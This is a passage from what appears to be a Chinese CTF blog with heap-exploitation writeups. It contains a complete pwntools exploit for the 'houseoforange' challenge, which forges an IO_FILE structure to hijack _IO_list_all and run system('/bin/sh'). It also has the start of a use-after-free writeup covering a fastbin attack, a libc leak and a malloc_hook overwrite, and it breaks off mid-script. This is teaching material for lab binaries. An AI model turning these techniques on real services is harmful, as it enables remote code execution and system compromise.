<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> (;; )<br>    &#123;<br>      <span class="hljs-type">int</span> iters = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))<br>        &#123;<br>          bck = victim-&gt;bk;<br>          <span class="hljs-keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)<br>              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="hljs-number">0</span>))<br>            malloc_printerr (check_action, <span class="hljs-string">&quot;malloc(): memory corruption&quot;</span>,<span class="hljs-comment">// 执行该函数</span><br>                             chunk2mem (victim), av);<br>          size = chunksize (victim);<br></code></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">sl(<span class="hljs-string">&#x27;1&#x27;</span>) <span class="hljs-comment">#get shell</span><br></code></pre></td></tr></table></figure>




<h2 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment">#-*- coding:utf-8 -*-</span><br><span class="hljs-comment"># Author: I0gan</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import LibcSearcher</span><br><br><span class="hljs-comment">#context.log_level=&#x27;debug&#x27;</span><br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>exeFile = <span class="hljs-string">&#x27;houseoforange&#x27;</span><br>libFile = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br><span class="hljs-comment">#libFile = &#x27;./libc64-2.19.so&#x27;</span><br><br>remoteIp = <span class="hljs-string">&quot;0.0.0.0&quot;</span><br>remotePort = <span class="hljs-number">0</span><br><br>LOCAL = <span class="hljs-number">1</span><br>LIB   = <span class="hljs-number">1</span><br><br>r   =  <span class="hljs-keyword">lambda</span> x : io.recv(x)<br>ra  =  <span class="hljs-keyword">lambda</span>   : io.recvall()<br>rl  =  <span class="hljs-keyword">lambda</span>   : io.recvline(keepends = <span class="hljs-literal">True</span>)<br>ru  =  <span class="hljs-keyword">lambda</span> x : io.recvuntil(x, drop = <span class="hljs-literal">True</span>)<br>s   =  <span class="hljs-keyword">lambda</span> x : io.send(x)<br>sl  =  <span class="hljs-keyword">lambda</span> x : io.sendline(x)<br>sa  =  <span class="hljs-keyword">lambda</span> x, y : io.sendafter(x, y)<br>sla =  <span class="hljs-keyword">lambda</span> x, y : io.sendlineafter(x, y)<br>ia  =  <span class="hljs-keyword">lambda</span> : io.interactive()<br>c   =  <span class="hljs-keyword">lambda</span> : io.close()<br>li    = <span class="hljs-keyword">lambda</span> x : log.info(<span class="hljs-string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="hljs-string">&#x27;\x1b[0m&#x27;</span>)<br>db    = <span class="hljs-keyword">lambda</span>   : gdb.attach(io)<br><br><span class="hljs-comment">#--------------------------Func-----------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ad</span>(<span class="hljs-params">size, data</span>):<br>	sla(<span class="hljs-string">&#x27;Your choice : &#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>	sla(<span class="hljs-string">&#x27;name :&#x27;</span>, <span class="hljs-built_in">str</span>(size))<br>	sa(<span class="hljs-string">&#x27;Name :&#x27;</span>, data)<br>	sla(<span class="hljs-string">&#x27;Price of Orange:&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">16</span>))<br>	sla(<span class="hljs-string">&#x27;Orange:&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>);<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">md</span>(<span class="hljs-params">size, data</span>):<br>	sla(<span class="hljs-string">&#x27;Your choice : &#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))<br>	sla(<span class="hljs-string">&#x27;name :&#x27;</span>, <span class="hljs-built_in">str</span>(size))<br>	sa(<span class="hljs-string">&#x27;Name:&#x27;</span>, data)<br>	sla(<span class="hljs-string">&#x27;Price of Orange:&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">16</span>))<br>	sla(<span class="hljs-string">&#x27;Orange:&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>);<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dp</span>():<br>	sla(<span class="hljs-string">&#x27;Your choice : &#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">q</span>():<br>	sla(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">5</span>))	<br><br><span class="hljs-comment">#--------------------------Exploit--------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>():<br>	main_arena = <span class="hljs-number">0x3c4b20</span><br>	<br>	ad(<span class="hljs-number">0x10</span>, <span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">0x10</span>)<br>	p = <span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">0x10</span><br>	p += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>)<br>	p += p64(<span class="hljs-number">0x1f00000010</span>)<br>	p += p64(<span class="hljs-number">0</span>)<br>	p += p64(<span class="hljs-number">0</span>)<br>	p += p64(<span class="hljs-number">0x00fa1</span>)<br>	<span class="hljs-comment"># top chunk size 0x20fa1</span><br>	<span class="hljs-comment"># top chunk addr 0x555555758060</span><br>	<span class="hljs-comment"># alignment: 555555779001 -&gt; 0x1000</span><br>	li(<span class="hljs-string">&#x27;addr: &#x27;</span> + <span class="hljs-built_in">hex</span>(<span class="hljs-number">0xfa1</span> + <span class="hljs-number">0x1000</span>))<br>	md(<span class="hljs-number">0x80</span>, p)<br><br>	ad(<span class="hljs-number">0x1000</span>, <span class="hljs-string">&#x27;B&#x27;</span> * <span class="hljs-number">0x10</span>)<br><br>	<span class="hljs-comment"># leak libc base with overflow</span><br>	ad(<span class="hljs-number">0x400</span>, <span class="hljs-string">&#x27;C&#x27;</span> * <span class="hljs-number">0x8</span>)<br><br>	dp()<br>	lib.address = u64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">5</span>:] + <span class="hljs-string">&#x27;\x7f\x00\x00&#x27;</span>) - main_arena - <span class="hljs-number">1640</span><br>	li(<span class="hljs-string">&#x27;libc_base &#x27;</span> + <span class="hljs-built_in">hex</span>(lib.address))<br><br>	<span class="hljs-comment"># leak heap addr with large bin</span><br>	md(<span class="hljs-number">0x10</span>, <span class="hljs-string">&#x27;C&#x27;</span> * <span class="hljs-number">0x10</span>)<br>	dp()<br>	ru(<span class="hljs-string">&#x27;CCCCCCCCCCCCCCCC&#x27;</span>)<br>	heap = u64(ru(<span class="hljs-string">&#x27;\x0a&#x27;</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0xc0</span><br>	li(<span class="hljs-string">&#x27;heap &#x27;</span> + <span class="hljs-built_in">hex</span>(heap))<br><br>	_IO_list_all = lib.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]<br>	li(<span class="hljs-string">&#x27;_IO_list_all &#x27;</span> + <span class="hljs-built_in">hex</span>(_IO_list_all))<br><br>	<span class="hljs-comment"># Control program</span><br>	p = <span class="hljs-string">&#x27;B&#x27;</span> * <span class="hljs-number">0x400</span><br>	p += p64(<span class="hljs-number">0</span>)<br>	p += p64(<span class="hljs-number">0x21</span>)<br>	p += <span class="hljs-string">&#x27;B&#x27;</span> * <span class="hljs-number">0x10</span><br><br>	<span class="hljs-comment"># fake file</span><br>	f = <span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span> <span class="hljs-comment"># flag overflow arg -&gt; system(&#x27;/bin/sh&#x27;)</span><br>	f += p64(<span class="hljs-number">0x61</span>)    <span class="hljs-comment"># _IO_read_ptr small bin size</span><br>	<span class="hljs-comment">#  unsoted bin attack</span><br>	f += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># _IO_read_end)</span><br>	f += p64(_IO_list_all - <span class="hljs-number">0x10</span>)  <span class="hljs-comment"># _IO_read_base</span><br><br>	<span class="hljs-comment">#bypass check</span><br>	<span class="hljs-comment"># fp-&gt;_IO_write_base &lt; fp-&gt;_IO_write_ptr</span><br><br>	<span class="hljs-comment"># fp-&gt;mode &lt;=0 ((addr + 0xc8) &lt;= 0)</span><br>	f += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># _IO_write_base </span><br>	f += p64(<span class="hljs-number">1</span>) <span class="hljs-comment"># _IO_write_ptr</span><br><br>	f += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># _IO_write_end</span><br>	f += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># _IO_buf_base</span><br>	f += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># _IO_buf_end</span><br>	f += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># _IO_save_base</span><br>	f += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># _IO_backup_base</span><br>	f += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># _IO_save_end</span><br>	f += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># *_markers</span><br>	f += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># *_chain</span><br><br>	f += p32(<span class="hljs-number">0</span>) <span class="hljs-comment"># _fileno</span><br>	f += p32(<span class="hljs-number">0</span>) <span class="hljs-comment"># _flags2</span><br><br>	f += p64(<span class="hljs-number">1</span>)  <span class="hljs-comment"># _old_offset</span><br><br>	f += p16(<span class="hljs-number">2</span>) <span class="hljs-comment"># ushort _cur_colum;</span><br>	f += p8(<span class="hljs-number">3</span>)  <span class="hljs-comment"># char _vtable_offset</span><br>	f += p8(<span class="hljs-number">4</span>)  <span class="hljs-comment"># char _shrotbuf[1]</span><br>	f += p32(<span class="hljs-number">0</span>) <span class="hljs-comment"># null for alignment</span><br><br>	f += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># _offset</span><br>	f += p64(<span class="hljs-number">6</span>) <span class="hljs-comment"># _codecvt</span><br>	f += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># _wide_data</span><br>	f += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># _freeres_list</span><br>	f += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># _freeres_buf</span><br><br>	f += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># __pad5</span><br>	f += p32(<span class="hljs-number">0</span>) <span class="hljs-comment"># _mode</span><br>	f += p32(<span class="hljs-number">0</span>) <span class="hljs-comment"># _unused2</span><br><br>	<span class="hljs-comment">#f = f.ljust(0xc0, &#x27;\x00&#x27;)</span><br><br>	p += f<br>	p += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> <span class="hljs-comment"># alignment to vtable</span><br>	p += p64(heap + <span class="hljs-number">0x5C8</span>) <span class="hljs-comment"># vtable</span><br>	p += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span><br><br>	p += p64(lib.sym[<span class="hljs-string">&#x27;system&#x27;</span>]) <span class="hljs-comment"># </span><br>	md(<span class="hljs-number">0x600</span>, p)<br><br>	db()<br>	sl(<span class="hljs-string">&#x27;1&#x27;</span>) <span class="hljs-comment">#get shell</span><br><br>	<span class="hljs-comment"># malloc(0x10) -&gt; malloc_printerr -&gt; overflow(IO_FILE addr) -&gt; system(&#x27;/bin/sh&#x27;)</span><br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">finish</span>():<br>	ia()<br>	c()<br><br><span class="hljs-comment">#--------------------------Main-----------------------------</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>	<br>	<span class="hljs-keyword">if</span> LOCAL:<br>		exe = ELF(exeFile)<br>		<span class="hljs-keyword">if</span> LIB:<br>			lib = ELF(libFile)<br>			io = exe.process(env = &#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libFile&#125;)<br>		<span class="hljs-keyword">else</span>:<br>			io = exe.process()<br>	<br>	<span class="hljs-keyword">else</span>:<br>		exe = ELF(exeFile)<br>		io = remote(remoteIp, remotePort)<br>		<span class="hljs-keyword">if</span> LIB:<br>			lib = ELF(libFile)<br>	<br>	exploit()<br>	finish()<br><br></code></pre></td></tr></table></figure>



<h1 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h1><h2 id="来源-5"><a href="#来源-5" class="headerlink" title="来源"></a>来源</h2><p>V&amp;N cnitlrt的面试,这是我自己按他要求出的题,然后自己打.</p>
<h2 id="难度-4"><a href="#难度-4" class="headerlink" title="难度"></a>难度</h2><p>5 &#x2F; 10</p>
<h2 id="保护-5"><a href="#保护-5" class="headerlink" title="保护"></a>保护</h2> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Arch:     amd64-64-little<br>RELRO:    Partial RELRO<br>Stack:    Canary found<br>NX:       NX enabled<br>PIE:      PIE enabled<br></code></pre></td></tr></table></figure>

<h2 id="简单描述-4"><a href="#简单描述-4" class="headerlink" title="简单描述"></a>简单描述</h2><p>只有添加和删除功能, 添加的时候输入大小,再输入内容, 而删除根据索引进行删除.</p>
<h2 id="vul-6"><a href="#vul-6" class="headerlink" title="vul"></a>vul</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">del</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+4h] [rbp-Ch]</span><br>  <span class="hljs-type">unsigned</span> __int64 v2; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v2 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  v1 = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;idx: &quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v1);<br>  <span class="hljs-built_in">free</span>(*((<span class="hljs-type">void</span> **)&amp;pheap + <span class="hljs-number">2</span> * v1)); <span class="hljs-comment">//  UAF漏洞</span><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;OK&quot;</span>);<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v2;<br>&#125;<br></code></pre></td></tr></table></figure>



<h2 id="知识点-4"><a href="#知识点-4" class="headerlink" title="知识点"></a>知识点</h2><p>fastbin attack, IO_FILE</p>
<h2 id="思路-6"><a href="#思路-6" class="headerlink" title="思路"></a>思路</h2><p>开辟一个small bin, 然后通过fastbin attack partial write 修改unsoted bin 的 fd 的后两字节指向<code>_IO_2_1_stderr</code> + 157处, 使用fastbin attack_IO_2_1_stdout&#96;结构体中泄漏libc, 再次使用fastbin attack 打入malloc_hook - 0x23处打one_gadget, realloc的push次数调整execve第二个参数, 打通概率 1 &#x2F;16</p>
<h2 id="利用-6"><a href="#利用-6" class="headerlink" title="利用"></a>利用</h2><h3 id="准备-2"><a href="#准备-2" class="headerlink" title="准备"></a>准备</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment">#-*- coding:utf-8 -*-</span><br><span class="hljs-comment"># Author: I0gan</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import LibcSearcher</span><br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-comment">#context(arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="hljs-comment">#context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br><br>exeFile = <span class="hljs-string">&#x27;pwn&#x27;</span><br>libFile = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br><br>remoteIp = <span class="hljs-string">&quot;0.0.0.0&quot;</span><br>remotePort = <span class="hljs-number">0</span><br><br>LOCAL = <span class="hljs-number">1</span><br>LIB   = <span class="hljs-number">1</span><br><br>r   =  <span class="hljs-keyword">lambda</span> x : io.recv(x)<br>ra  =  <span class="hljs-keyword">lambda</span>   : io.recvall()<br>rl  =  <span class="hljs-keyword">lambda</span>   : io.recvline(keepends = <span class="hljs-literal">True</span>)<br>ru  =  <span class="hljs-keyword">lambda</span> x : io.recvuntil(x, drop = <span class="hljs-literal">True</span>)<br>s   =  <span class="hljs-keyword">lambda</span> x : io.send(x)<br>sl  =  <span class="hljs-keyword">lambda</span> x : io.sendline(x)<br>sa  =  <span class="hljs-keyword">lambda</span> x, y : io.sendafter(x, y)<br>sla =  <span class="hljs-keyword">lambda</span> x, y : io.sendlineafter(x, y)<br>ia  =  <span class="hljs-keyword">lambda</span> : io.interactive()<br>c   =  <span class="hljs-keyword">lambda</span> : io.close()<br>li    = <span class="hljs-keyword">lambda</span> x : log.info(<span class="hljs-string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="hljs-string">&#x27;\x1b[0m&#x27;</span>)<br>db    = <span class="hljs-keyword">lambda</span>   : gdb.attach(io)<br><br><span class="hljs-comment">#--------------------------Func-----------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ad</span>(<span class="hljs-params">size, data</span>):<br>	sla(<span class="hljs-string">&#x27;2.del&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>	sla(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(size))<br>	sa(<span class="hljs-string">&#x27;:&#x27;</span>, data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rm</span>(<span class="hljs-params">idx</span>):<br>	sla(<span class="hljs-string">&#x27;2.del&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))<br>	sla(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">q</span>():<br>	sla(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))	<br>	<br><span class="hljs-comment">#--------------------------Exploit--------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>():<br>	a = <span class="hljs-number">0</span>;<br>	<br><span class="hljs-comment">#--------------------------Main-----------------------------</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>	<br>	<span class="hljs-keyword">if</span> LOCAL:<br>		exe = ELF(exeFile)<br>		<span class="hljs-keyword">if</span> LIB:<br>			lib = ELF(libFile)<br>			io = exe.process(env = &#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libFile&#125;)<br>		<span class="hljs-keyword">else</span>:<br>			io = exe.process()<br>	<br>	<span class="hljs-keyword">else</span>:<br>		exe = ELF(exeFile)<br>		io = remote(remoteIp, remotePort)<br>		<span class="hljs-keyword">if</span> LIB:<br>			lib = ELF(libFile)<br>	<br>	exploit()<br>	finish()<br></code></pre></td></tr></table></figure>



<h3 id="堆布局"><a href="#堆布局" class="headerlink" title="堆布局"></a>堆布局</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">ad(<span class="hljs-number">0x20</span>, <span class="hljs-string">&#x27;A&#x27;</span>) <span class="hljs-comment"># idx 0 为了使用fastbin attack打入unsoted bin-0x10处</span><br><br>p = <span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">0x50</span><br>   <span class="hljs-comment">#伪造的堆块,后面要申请到此处来实现修改chunk 2的size和fd</span><br>p += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># prev_size</span><br>p += p64(<span class="hljs-number">0x31</span>) <span class="hljs-comment"># size</span><br><br>ad(<span class="hljs-number">0x60</span>, p) <span class="hljs-comment"># idx 1</span><br>ad(<span class="hljs-number">0x80</span>, <span class="hljs-string">&#x27;B&#x27;</span>) <span class="hljs-comment"># idx 2 为了partiwritefast bin attack实现打入_IO_2_1_stderr + 157处</span><br>ad(<span class="hljs-number">0x20</span>, <span class="hljs-string">&#x27;A&#x27;</span>) <span class="hljs-comment"># idx 3 为了使用fastbin attack打入unsoted bin-0x10处</span><br>ad(<span class="hljs-number">0x60</span>, <span class="hljs-string">&#x27;A&#x27;</span>) <span class="hljs-comment"># idx 4 为了与修改后的chunk 2在fastbin中连接起来,然后就可以实现打入IO_2_1_stdout中</span><br><br><span class="hljs-comment"># for fastbin attack to _free_hook</span><br>ad(<span class="hljs-number">0x60</span>, <span class="hljs-string">&#x27;A&#x27;</span>) <span class="hljs-comment"># idx 5 为了fastbin attac 打入malloc_hook - 0x23</span><br>ad(<span class="hljs-number">0x60</span>, <span class="hljs-string">&#x27;A&#x27;</span>) <span class="hljs-comment"># idx 6 为了fastbin attac 打入malloc_hook - 0x23</span><br></code></pre></td></tr></table></figure>



<h3 id="打入chunk-2修改size-和fd"><a href="#打入chunk-2修改size-和fd" class="headerlink" title="打入chunk 2修改size 和fd"></a>打入chunk 2修改size 和fd</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python">rm(<span class="hljs-number">3</span>) <span class="hljs-comment"># 为了 构造fastbin attack</span><br>rm(<span class="hljs-number">0</span>)<br>rm(<span class="hljs-number">3</span>)<br><br>rm(<span class="hljs-number">2</span>) <span class="hljs-comment"># 先释放掉chunk 2,使fd 为main_arena + 0x58</span><br>   <br>   <span class="hljs-comment"># 这里采用partial write 方式修改 chunk 3中的fd指向 chunk 2 - 0x10处，这里是我们伪造好的堆块</span><br>   ad(<span class="hljs-number">0x20</span>, <span class="hljs-string">&#x27;\x90&#x27;</span>) <span class="hljs-comment"># attack to chunk 2 - 0x10</span><br><br>ad(<span class="hljs-number">0x20</span>, <span class="hljs-string">&#x27;A&#x27;</span>) <span class="hljs-comment"># 调整</span><br>ad(<span class="hljs-number">0x20</span>, <span class="hljs-string">&#x27;A&#x27;</span>) <span class="hljs-comment"># 调整</span><br><br>   <span 